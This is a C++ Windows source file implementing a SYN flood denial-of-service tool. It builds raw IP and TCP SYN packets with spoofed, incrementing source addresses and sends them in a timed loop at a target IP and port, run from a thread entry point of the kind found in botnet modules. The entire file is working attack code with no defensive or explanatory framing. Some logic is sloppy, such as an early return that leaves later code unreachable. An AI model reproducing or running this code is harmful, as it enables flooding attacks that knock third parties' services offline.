#include <iostream>
#include <winsock2.h>
#include <string.h>
#include <string>
#include "tcpip.h"
#include "synflood.h"
#pragma comment(lib,"ws2_32.lib")
#ifndef NO_SYN

unsigned short checksum(unsigned short *packet, int length)
{
    unsigned int sum = 0;
    int i=0;
    while(i<length)    //16-bit sum
    {
        //is there only 1 byte left (odd length)
        if((i+1)==length)
        {
            sum+=packet[i]; //add it to the sum
            i+=1; //or break
        }
        //2 bytes left (even length)
        else
        {
            sum += (packet[i] | (packet[i+1] << 8));    //add it to the sum
            i+=2;
        }
    }
    unsigned int carry = (sum & 0xFF0000)>>16;    //get carry
    sum &= 0xFFFF;    //remove carry from sum's MSB
    sum += carry;    //add carry to sum for 1's compliment
    return ~sum;
}

DWORD WINAPI SynFloodThread(LPVOID param)
{

    SYNFLOOD synflood = *((SYNFLOOD *)param);
    SYNFLOOD *synfloods = (SYNFLOOD *)param;

SynFlood(synflood.ip, synflood.port, synflood.length);

    ExitThread(0);
}

long SendSyn(unsigned long TargetIP, unsigned int SpoofingIP, unsigned short TargetPort, int len)
{
    IPHEADER ipHeader;
    TCPHEADER tcpHeader;
    PSDHEADER psdHeader;

    LARGE_INTEGER freq, halt_time, cur;
    char szSendBuf[60]={0},buf[64];
    int rect;

    WSADATA WSAData;
    if (WSAStartup(MAKEWORD(2,2), &WSAData) != 0)
        return FALSE;

    SOCKET sock;
    if ((sock = WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED)) == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }

    BOOL flag=TRUE;
    if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(flag)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }

    SOCKADDR_IN ssin;
    memset(&ssin, 0, sizeof(ssin));
    ssin.sin_family=AF_INET;
    ssin.sin_port=htons(TargetPort);
    ssin.sin_addr.s_addr=TargetIP;

    ipHeader.verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
    ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader));
    ipHeader.ident=1;
    ipHeader.frag_and_flags=0;
    ipHeader.ttl=128;
    ipHeader.proto=IPPROTO_TCP;
    ipHeader.checksum=0;
    ipHeader.destIP=TargetIP;

    tcpHeader.dport=htons(TargetPort);
    tcpHeader.ack_seq=0;
    tcpHeader.lenres=(sizeof(tcpHeader)/4<<4|0);
    tcpHeader.flags=2;
    tcpHeader.window=htons(16384);
    tcpHeader.urg_ptr=0;

    long total = 0;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&cur);
    halt_time.QuadPart = (freq.QuadPart * len) + cur.QuadPart;

    while (1) {
        tcpHeader.checksum=0;
        tcpHeader.sport=htons((unsigned short)((rand() % 1001) + 1000));
        tcpHeader.seq=htons((unsigned short)((rand() << 16) | rand()));

        ipHeader.sourceIP=htonl(SpoofingIP++);

        psdHeader.daddr=ipHeader.destIP;
        psdHeader.zero=0;
        psdHeader.proto=IPPROTO_TCP;
        psdHeader.length=htons(sizeof(tcpHeader));
        psdHeader.saddr=ipHeader.sourceIP;
        memcpy(szSendBuf, &psdHeader, sizeof(psdHeader));
        memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));

        tcpHeader.checksum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader));

        memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
        memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
        memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4);
        ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader));

        memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
    //    std::cout<<"Test";
        rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader),0,(LPSOCKADDR)&ssin, sizeof(ssin));
        if (rect==SOCKET_ERROR) {
            sprintf(buf, "[SYN]: Send error: <%d>.",WSAGetLastError());

            closesocket(sock);
            WSACleanup();
            return 0;
        }

        total += rect;
        QueryPerformanceCounter(&cur);
        if (cur.QuadPart >= halt_time.QuadPart)
            break;
    }

    closesocket(sock);
    WSACleanup();

    return (total);
}

long SynFlood(char *target, char *port, char *len)
{
    unsigned long TargetIP = inet_addr(target);
    unsigned short p = (unsigned short)atoi(port);
    int t = atoi(len);
    //unsigned int SpoofIP = TargetIP + ((rand()%512)+256);
    unsigned int SpoofIP = 1234578353;

    long num = SendSyn(TargetIP, SpoofIP, p, t);
    return SpoofIP;
    if (num == 0)
        num = 1;  
    num = num / 1000 / t;

    return num;
}
#endif